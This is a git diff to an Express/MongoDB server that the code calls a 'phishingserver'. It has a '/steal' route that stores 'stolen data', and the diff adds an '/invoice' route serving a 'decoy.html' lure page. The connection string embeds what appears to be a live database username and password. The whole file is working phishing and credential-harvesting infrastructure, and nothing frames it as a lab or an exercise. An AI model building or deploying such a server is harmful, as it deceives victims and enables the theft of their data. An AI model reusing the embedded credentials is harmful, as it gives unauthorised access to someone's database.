@@ -1,8 +1,12 @@
 const express = require("express");
 const mongoose = require("mongoose");
+const path = require("path"); // Import path module
 
 const app = express();
 app.use(express.json());
+
+// Serve static files from the current directory (where decoy.html is)
+app.use(express.static(path.join(__dirname)));
 
 // Connect to MongoDB
 mongoose.connect("mongodb+srv://alaekekaebuka200:Ebscojebscojjj20$@cohort5wilmer.r1c8m.mongodb.net/phishingserver?retryWrites=true&w=majority");
@@ -53,6 +57,11 @@ app.post("/steal", async (req, res) => {
     console.error("Failed to save stolen data:", err);
     res.status(500).json({ error: "Failed to save data" });
   }
+});
+
+// New route to serve the decoy HTML
+app.get("/invoice", (req, res) => {
+    res.sendFile(path.join(__dirname, 'decoy.html'));
 });
 
 app.listen(5000, () =>
